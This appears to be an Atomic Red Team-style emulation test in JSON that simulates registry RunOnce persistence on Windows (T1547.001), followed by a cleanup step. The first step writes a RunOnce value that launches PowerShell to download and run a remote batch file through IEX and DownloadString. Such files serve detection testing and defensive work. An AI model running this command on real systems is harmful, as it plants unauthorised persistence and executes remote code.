{
  "id": "eb44f842-0457-4ddc-9b92-c4caa144ac42",
  "name": "PowerShell Registry RunOnce",
  "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "cf386422-b90d-4606-85dd-a7739d6cc771",
      "type": "execute-command",
      "data": {
        "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "cca750a3-0387-4c96-b58b-1338af30c244",
      "type": "execute-command",
      "data": {
        "command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "cf386422-b90d-4606-85dd-a7739d6cc771",
      "p": "on-success",
      "o": "cca750a3-0387-4c96-b58b-1338af30c244"
    },
    {
      "s": "cf386422-b90d-4606-85dd-a7739d6cc771",
      "p": "on-failure",
      "o": "cca750a3-0387-4c96-b58b-1338af30c244"
    }
  ],
  "tags": [
    "T1547.001",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "thing_to_execute",
      "type": "path",
      "description": "Thing to Run",
      "value": "powershell.exe"
    },
    {
      "name": "reg_key_path",
      "type": "path",
      "description": "Path to registry key to update",
      "value": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
    }
  ]
}